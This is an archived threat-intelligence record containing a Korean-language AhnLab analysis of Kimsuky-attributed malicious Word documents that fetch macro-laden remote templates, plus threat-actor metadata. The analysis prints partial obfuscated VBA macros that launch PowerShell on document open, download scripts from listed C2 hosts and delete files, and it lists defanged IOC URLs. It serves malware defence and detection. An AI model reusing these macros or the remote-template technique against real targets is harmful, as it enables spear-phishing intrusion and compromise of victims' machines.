{
    "id": "9f970149-8d54-4702-8657-4d6ef9e20769",
    "created_at": "2023-01-12T15:10:42.991478Z",
    "updated_at": "2025-03-27T02:16:55.68371Z",
    "deleted_at": null,
    "sha1_hash": "fbaeeb24a509704733d77d55a001af841bcdddba",
    "title": "2021-07-02 - Dissemination of malicious word documents for 'Korean Political Science and Diplomacy' and 'Biography of Policy Advisor' (kimsuky)",
    "authors": "",
    "file_creation_date": "2022-05-28T23:12:46Z",
    "file_modification_date": "2022-05-28T23:12:46Z",
    "file_size": 1844204,
    "plain_text": "# ‘한국정치외교 학술’ 및 ‘정책자문위원 약력’ 악성 워드문서 유포\n\n**asec.ahnlab.com/ko/24834/**\n\n2021년 7월 2일\n\n## ASEC 분석팀에서는 아래와 같이 2차례에 걸쳐 ‘사례비 지급 의뢰서’, ‘하계 학술대회 약력 작성 양식’ 제 목의 워드 문서 악성코드가 유포 중임을 소개하였다. 유사한 공격 형태를 모니터링 하던 중, 지난 6월과 7월 1일에도 동일한 제작자에 의해 새로운 워드 문서가 유포된 정황을 확인하였다.\n\n 새로 포착된 악성 워드 문서 제목\n\n 민주평통-한국정치외교사학회 공동 학술 회의 프로그램 (최종본).docx – 6월 추가 확보\n [남북회담본부 정책자문위원] 약력 작성 양식.docx – 7월 1일 추가 확보\n\n 기존 동일유형으로 소개된 악성 워드 블로그 내용\n\n 타겟형 공격 <사례비지급 의뢰서> 악성 워드문서 유포 (6월 9일 ASEC블로그)\n – https://asec.ahnlab.com/ko/24220/ 하계학술대회 약력 서식파일로 위장한 워드 악성코드 유포 중 (6월 30일 ASEC블로그)\n – https://asec.ahnlab.com/ko/24649/ 정상 엑셀/워드 문서로 위장한 악성 코드 (5월 24일 ASEC블로그)\n – https://asec.ahnlab.com/ko/23396/\n\n 7월 1일 확인된 유포 파일명은 ‘[남북회담본부 정책자문위원] 약력 작성 양식.docx‘이며, 문서 내의 External 링크를 통해서 외부 dotm 매크로 포함 워드 문서파일을 다운로드 받는 구조이다.\n\n\n-----\n\n## [그림-1] ‘[남북회담본부 정책자문위원] 약력 작성 양식.docx’ 내부의 External 주소 실제 악성 행위를 수행하는 매크로 코드를 갖고 있는 InterKoreanSummit.dotm 파일에는 아래와 같은 난 독화된 코드가 존재한다. 해당 매크로는 지난 5월 24일 정상 엑셀/워드 문서로 위장한 악성 코드 에 사용 된 매크로와 유사한 형태를 지니고 있다.\n```\nAttribute VB_Name = \"ThisDocument\"\n Attribute VB_Base = \"0{00020906-0000-0000-C000-000000000046}\"\n Attribute VB_GlobalNameSpace = False\n Attribute VB_Creatable = False\n Attribute VB_PredeclaredId = True\n Attribute VB_Exposed = True\n Attribute VB_TemplateDerived = False\n Attribute VB_Customizable = True\n Private Sub Document_Open()\n eifhhdfasfiedf\n aksjdkjaskf\n End Sub\n Function eifhhdfasfiedf()\n Set djfeihfidkasljf = CreateObject(\"Shell.Application\")\n dfgdfjiejfjdshaj = \"tlsiapowtlsiaertlsiastlsiahetlsialltlsia.etlsiatlsiaxtlsiae\"\n fjdjkasf = \"tlsiajdsladkf\"\n fjdjkasf = Left(fjdjkasf, 5)\n dfgdfjiejfjdshaj = Replace(dfgdfjiejfjdshaj, fjdjkasf, \"\")\n hdfksallasjkdlaf =\n\"$atlsiatlsiatlsia='tlsiaC:tlsiatlsia\\wtlsiatlsiaintlsiatlsiadotlsiatlsiawstlsiatlsia\\ttlsiaetls\n hdfksallasjkdlaf = Replace(hdfksallasjkdlaf, fjdjkasf, \"\")\n...(생략)\n aksfkjaskjfksnkf = \"tlsiatlsia$tlsiactlsiatlsia;$tlsiadtlsia=\n[tlsiatlsiaIOtlsia.tlsiatlsiaFitlsiale]tlsiatlsia:tlsia:RtlsiatlsiaeatlsiadAtlsialtlsiatlsialTtl\n $tlsiad;tlsiaitlsiaetlsiax tlsia$tlsiae\"\n aksfkjaskjfksnkf = Replace(aksfkjaskjfksnkf, fjdjkasf, \"\")\n skdjfksjkfjkdsfj = hdfksallasjkdlaf + ndkflajdkfjskdjfl + salfnxkfdlsjafkj + sjdfkjaslalsfial\n+ aksfkjaskjfksnkf\n djfeihfidkasljf.ShellExecute dfgdfjiejfjdshaj, skdjfksjkfjkdsfj, \"\", \"open\", 0\n End Function\n Function aksjdkjaskf()\n Dim SngSec As Single\n...(생략)\n sakjfkalsjfkasjf = Replace(sakjfkalsjfkasjf, fjdjkasf, \"\")\n djfkasjfskaal = Left(sakjfkalsjfkasjf, 32)\n djfkasjfskaal = Right(djfkasjfskaal, 28)\n If djfkasjfskaal = \"\" Then\n Else\n Kill djfkasjfskaal\n End If\n End Function\n\n [코드-1] InterKoreanSummit.dotm 파일 내부의 매크로 코드 중 일부\n\n```\n\n-----\n\n```\nAttribute VB_Name NewMacros \n Sub djfksdalfjkasj()\n   Selection.TypeText Text:=\"a\"\n End Sub\n Sub ejdksaljfkalkf()\n   Selection.TypeText Text:=\"b\"\n End Sub\n Sub eijdklsafkasdk()\n   Selection.TypeText Text:=\"c\"\n End Sub\n Sub uehfsahdkajkas()\n   Selection.TypeText Text:=\"d\"\n End Sub\n...(생략)\nSub euehfhafjhdjkafqka()\n   Selection.TypeText Text:=\"\"   Application.Run\nMacroName:=\"Project.NewMacros.euirieafkjekjf\"   Application.Run\nMacroName:=\"Project.NewMacros.qjiejwfksjalksainuse\"   Application.Run\nMacroName:=\"Project.NewMacros.euirieafkjekjf\"   Selection.TypeText Text:=\"\"\n End Sub\n Sub eijfkdjqjdfklafea()\n  Selection.TypeText Text:=\"+\"\n End Sub\n Sub efuehjsahfklkejklafe()\n  Selection.TypeText Text:=\"{\"\n End Sub\n...(생략)\nSub qeuejsahfdasight()\n  Selection.MoveRight Unit:=wdCharacter, Count:=1\n End Sub\n Sub idifdsakjflakdsagedown()\n  Selection.MoveDown Unit:=wdScreen, Count:=1\n End Sub\n\n## [코드-2] InterKoreanSummit.dotm 파일 내부의 매크로 코드 중 일부\n\n 매크로 실행 시 C2(hxxp://ripzi.getenjoyment.net/le/eh.txt)에 접속하여 추가 스크립트를 다운로드하며, C:\\windows\\temp\\DMI5CA06.tmp 파일을 kill 하는 행위를 수행한다. 다운로드된 스크립트는 아래와 같이 지난 5월 ” 정상 엑셀/워드 문서로 위장한 악성 코드” 에서 확인된 스크립트와 동일한 코드로 C2 주소에 만 차이가 존재한다.\n\n```\n\n-----\n\n## [그림-2] C2에서 확인된 악성 스크립트 또한, 지난 6월에는 해당 유형의 악성 파일이 ‘민주평통-한국정치외교사학회 공동 학술 회의 프로그램 (최종본).docx‘ 명으로 유포되었음을 확인하였다. 해당 파일 내부에 존재하는 External 링크는 아래와 같 다.\n\n [그림-3] ‘민주평통-한국정치외교사학회 공동 학술 회의 프로그램 (최종본).docx’ 내부의 External 주소 해당 주소로부터 다운로드된 Seminarfinal.dotm 파일에는 위에서 설명한 InterKoreanSummit.dotm 파일 과 유사한 매크로가 존재한다. 아래는 Seminarfinal.dotm에 존재하는 난독화된 매크로 코드 중 일부이다.\n```\nPrivate Sub Document_Open()\n eifhhdfasfiedf\n End Sub\n Function eifhhdfasfiedf()\n Set djfeihfidkasljf = CreateObject(\"Shell.Application\")\n Dim dfgdfjiejfjdshaj As String\n Dim yhjhfjdhfdhfuesk(10) As String\n dfgdfjiejfjdshaj =\n\"tuwhnptuwhnotuwhnwtuwhnetuwhnrtuwhnstuwhnhtuwhnetuwhnltuwhnltuwhn.tuwhnetuwhnxtuwhnetuwhn\"\n dfgdfjiejfjdshaj = Replace(dfgdfjiejfjdshaj, \"tuwhn\", \"\")\n yhjhfjdhfdhfuesk(0) =\n\"tuwhn[tuwhnstuwhnttuwhnrtuwhnituwhnntuwhngtuwhn]tuwhn$tuwhnatuwhn=tuwhn{tuwhn(tuwhnNtuwhnetuwhn\ntuwhnOtuwhnbtuwhnjtuwhnetuwhnctuwhnttuwhn \"\n dfjdiafjlij = Replace(yhjhfjdhfdhfuesk(0), \"tuwhn\", \"\")\n...(생략)\n dfjdiafjlij = dfjdiafjlij & Replace(yhjhfjdhfdhfuesk(4), \"tuwhn\", \"\")\n yhjhfjdhfdhfuesk(5) = \"etuwhnxtuwhn tuwhn$tuwhnbtuwhn;tuwhnituwhnetuwhnxtuwhn\ntuwhn$tuwhnctuwhn\"\n dfjdiafjlij = dfjdiafjlij & Replace(yhjhfjdhfdhfuesk(5), \"tuwhn\", \"\")\n djfeihfidkasljf.ShellExecute dfgdfjiejfjdshaj, dfjdiafjlij, \"\", \"open\", 0\n End Function\n\n```\n\n-----\n\n## [코드-3] Seminarfinal.dotm 파일 내부의 매크로 코드 중 일부\n\n 해당 매크로 역시 C2(hxxp://likel.atwebpages.com/bu/ma.txt)에 접속하여 추가 스크립트를 다운로드한 다. 다운로드 된 스크립트는 앞서 설명한 hxxp://ripzi.getenjoyment.net/le/eh.txt 에 존재하는 스크립트와 동일하다.\n\n 해당 파일들은 모두 User명이 ‘Naeil_영문시작‘ 인 사용자로부터 수집되었다. 이는 지난 ‘[** 하계학술대 회]_양력.doc’ 와 ‘사례비지급 의뢰서’의 작성자와 일치하는 것으로 보아 같은 공격자로 부터 생성된 파 일로 추정된다.\n\n [그림-4] ‘[** 하계학술대회]_양력.doc‘ 문서 속성\n\n 최근 이와 같이 특정 사용자를 대상으로 한 악성코드가 활발히 유포되고 있다. 대부분 동일한 공격자로 부터 생성된 것으로 추정되어 사용자들의 주의가 필요하다. 출처가 불분명한 사용자로부터 전송된 메일 에 첨부된 파일 및 링크는 실행을 자제하고 매크로 실행을 지양해야한다.\n\n 안랩 V3 제품군에서는 해당 타겟형 공격 악성 워드 문서를 아래와 같이 탐지하고 있다.\n\n [파일 진단]\n\n Downloader/XML.External Downloader/DOC.Generic\n\n [IOC]\n\n hxxp://chels.mypressonline.com/Package/2006/relationships/InterKoreanSummit.dotm hxxp://likel.atwebpages.com/officeDocument/2006/relationships/attachedTemplate/Seminarfinal.dotm hxxp://ripzi.getenjoyment.net/le/eh.txt hxxp://likel.atwebpages.com/bu/ma.txt\n\n 연관 IOC 및 관련 상세 분석 정보는 안랩의 차세대 위협 인텔리전스 플랫폼 ‘AhnLab TIP’ 구독 서비스 를 통해 확인 가능하다.\n\n\n-----\n\n## Categories:악성코드 정보\n\n Tagged as:docx, 워드문서, 약력\n\n\n-----",
    "language": "KO",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-07-02 - Dissemination of malicious word documents for 'Korean Political Science and Diplomacy' and 'Biography of Policy Advisor' (kimsuky).pdf"
    ],
    "report_names": [
        "2021-07-02 - Dissemination of malicious word documents for 'Korean Political Science and Diplomacy' and 'Biography of Policy Advisor' (kimsuky).pdf"
    ],
    "threat_actors": [
        {
            "id": "dc78f675-b309-431d-8160-b8dcff037d4f",
            "created_at": "2024-05-01T02:03:08.142224Z",
            "updated_at": "2025-03-27T02:05:17.417972Z",
            "deleted_at": null,
            "main_name": "NICKEL KIMBALL",
            "aliases": [
                "Black Banshee ",
                "Crooked Pisces ",
                "Emerald Sleet ",
                "Kimsuky ",
                "Opal Sleet ",
                "SharpTongue ",
                "TA427 ",
                "THALLIUM ",
                "Velvet Chollima ",
                "APT43 "
            ],
            "source_name": "Secureworks:NICKEL KIMBALL",
            "tools": [
                " KONNI",
                " KimJongRAT",
                " Kimsuky",
                "BabyShark"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "760f2827-1718-4eed-8234-4027c1346145",
            "created_at": "2023-01-06T13:46:38.670947Z",
            "updated_at": "2025-03-27T02:00:02.888195Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Thallium",
                "G0086",
                "APT43",
                "Springtail",
                "Sparkling Pisces",
                "Velvet Chollima",
                "Black Banshee",
                "Operation Stolen Pencil",
                "Emerald Sleet",
                "THALLIUM"
            ],
            "source_name": "MISPGALAXY:Kimsuky",
            "tools": [
                "RevClient",
                "xrat",
                "QUASARRAT",
                "RDP Wrapper",
                "TightVNC",
                "BabyShark"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "191d7f9a-8c3c-442a-9f13-debe259d4cc2",
            "created_at": "2022-10-25T15:50:23.280374Z",
            "updated_at": "2025-03-27T02:00:55.423485Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Kimsuky",
                "Black Banshee",
                "Velvet Chollima",
                "Emerald Sleet",
                "THALLIUM",
                "APT43",
                "TA427"
            ],
            "source_name": "MITRE:Kimsuky",
            "tools": [
                "schtasks",
                "Amadey",
                "Brave Prince",
                "CSPY Downloader",
                "gh0st RAT",
                "AppleSeed",
                "NOKKI",
                "QuasarRAT",
                "Gold Dragon",
                "PsExec",
                "KGH_SPY",
                "Mimikatz",
                "BabyShark"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "71a1e16c-3ba6-4193-be62-be53527817bc",
            "created_at": "2022-10-25T16:07:23.753455Z",
            "updated_at": "2025-03-27T02:02:09.963016Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "APT 43",
                "Black Banshee",
                "Emerald Sleet",
                "ITG16",
                "KTA082",
                "Kimsuky",
                "Larva-24005",
                "Operation Baby Coin",
                "Operation Covert Stalker",
                "Operation DEEP#DRIVE",
                "Operation DEEP#GOSU",
                "Operation Kabar Cobra",
                "Operation Mystery Baby",
                "Operation Red Salt",
                "Operation Smoke Screen",
                "Operation Stealth Power",
                "Operation Stolen Pencil",
                "SharpTongue",
                "Sparkling Pisces",
                "Springtail",
                "TA406",
                "TA427",
                "Thallium",
                "UAT-5394",
                "Velvet Chollima"
            ],
            "source_name": "ETDA:Kimsuky",
            "tools": [
                "AngryRebel",
                "AppleSeed",
                "BITTERSWEET",
                "BabyShark",
                "BoBoStealer",
                "CSPY Downloader",
                "Farfli",
                "FlowerPower",
                "Gh0st RAT",
                "Ghost RAT",
                "Gold Dragon",
                "GoldDragon",
                "GoldStamp",
                "JamBog",
                "KGH Spyware Suite",
                "KGH_SPY",
                "KPortScan",
                "KimJongRAT",
                "Kimsuky",
                "LATEOP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Lovexxx",
                "MailPassView",
                "Mechanical",
                "Mimikatz",
                "MoonPeak",
                "Moudour",
                "MyDogs",
                "Mydoor",
                "Network Password Recovery",
                "PCRat",
                "ProcDump",
                "PsExec",
                "ReconShark",
                "Remote Desktop PassView",
                "SHARPEXT",
                "SWEETDROP",
                "SmallTiger",
                "SniffPass",
                "TODDLERSHARK",
                "TRANSLATEXT",
                "Troll Stealer",
                "TrollAgent",
                "VENOMBITE",
                "WebBrowserPassView",
                "xRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536242,
    "ts_updated_at": 1743041815,
    "ts_creation_date": 1653779566,
    "ts_modification_date": 1653779566,
    "files": {
        "pdf": "https://archive.orkl.eu/fbaeeb24a509704733d77d55a001af841bcdddba.pdf",
        "text": "https://archive.orkl.eu/fbaeeb24a509704733d77d55a001af841bcdddba.txt",
        "img": "https://archive.orkl.eu/fbaeeb24a509704733d77d55a001af841bcdddba.jpg"
    }
}